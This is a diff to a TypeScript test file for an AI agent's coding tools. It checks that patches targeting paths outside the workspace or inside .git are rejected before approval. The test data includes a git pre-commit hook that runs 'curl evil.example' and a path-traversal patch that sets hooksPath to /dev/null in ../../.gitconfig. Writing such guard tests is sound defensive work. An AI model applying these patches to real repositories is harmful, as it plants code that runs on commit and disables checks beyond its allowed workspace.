@@ -19,7 +19,7 @@ import {
   parsePatch,
   type ToolRunContext,
 } from "../src/index.ts";
-import { call, endOf, harness, say, start, until } from "./harness.ts";
+import { call, endOf, harness, runTurn, say, start, until } from "./harness.ts";
 
 const run = promisify(execFile);
 
@@ -247,9 +247,10 @@ describe("code.* tools (V10)", () => {
       code: "conflict",
     });
     const hook = "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+curl evil.example\n";
-    await expect(use("code.edit", { root: repo, patch: hook })).rejects.toMatchObject({
-      code: "forbidden",
-    });
+    // Refused before the broker now (#439): the validation error, never a card.
+    await expect(use("code.edit", { root: repo, patch: hook })).rejects.toThrow(
+      /invalid: .*inside \.git/,
+    );
     expect(writes).toHaveLength(1);
     await expect(use("code.edit", { root: repo, patch: "not a diff" })).rejects.toThrow(
       /invalid: patch/,
@@ -366,6 +367,58 @@ describe("code.* tools (V10)", () => {
       },
     );
     expect((await use("code.git", { root: repo, op: "log" })).output.commits).toHaveLength(1);
+  });
+});
+
+describe("patch paths on the card (#439)", () => {
+  // INT-3's corpus case code-patch-gitconfig-hooks-011: a patch that climbs out of the repo.
+  const ESCAPE =
+    "--- a/../../.gitconfig\n+++ b/../../.gitconfig\n@@ -1,2 +1,4 @@\n [user]\n   name = Avery\n+[core]\n+  hooksPath = /dev/null\n";
+
+  it("refuses a path outside the workspace or under .git before the broker, with run's error", () => {
+    const { byName } = setup();
+    const edit = byName.get("code.edit") as AgentToolRegistration;
+    expect(edit.validate?.({ root: repo, patch: ESCAPE })).toBe(
+      `../../.gitconfig is outside the workspace ${repo}`,
+    );
+    const hook = "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+exit 0\n";
+    expect(edit.validate?.({ root: repo, patch: hook })).toMatch(/inside \.git/);
+    expect(edit.validate?.({ root: repo, patch: FIX })).toBeUndefined();
+  });
+
+  it("names every file in the summary by its repo path, three at most and a count", () => {
+    const { byName } = setup();
+    const describe = byName.get("code.edit")?.describeCall;
+    expect(describe?.({ root: repo, patch: FIX })?.summary).toBe("Edit src/add.js in repo (+1 −1)");
+    const many = ["a.ts", "b/c.ts", "d.ts", "e.ts", "f.ts"]
+      .map((f) => `--- /dev/null\n+++ b/${f}\n@@ -0,0 +1 @@\n+x\n`)
+      .join("");
+    expect(describe?.({ root: repo, patch: many })?.summary).toBe(
+      "Edit a.ts, b/c.ts, d.ts and 2 more in repo (+5 −0)",
+    );
+  });
+
+  it("never reaches a card through the loop", async () => {
+    const h = harness({
+      script: [
+        call("o1", "code.open", { path: repo }),
+        call("e1", "code.edit", { root: repo, patch: ESCAPE }),
+        say("done"),
+      ],
+      policy: { byTool: { "code.open": "allow" }, bySideEffect: { write: "ask" } },
+    });
+    const writes: string[] = [];
+    for (const t of codingTools({
+      files: fileTools(writes),
+      folders: () => [{ path: dir, mode: "rw" }],
+      git: hostGit,
+    }))
+      h.loop.registry.register(t);
+    const events = await runTurn(h, `fix ${repo}`);
+    expect(endOf(events).outcome).toBe("final");
+    expect(h.broker.issued).toHaveLength(0);
+    expect(h.broker.decisions.map((d) => d.call.tool)).toEqual(["code.open"]);
+    expect(writes).toEqual([]);
   });
 });
 
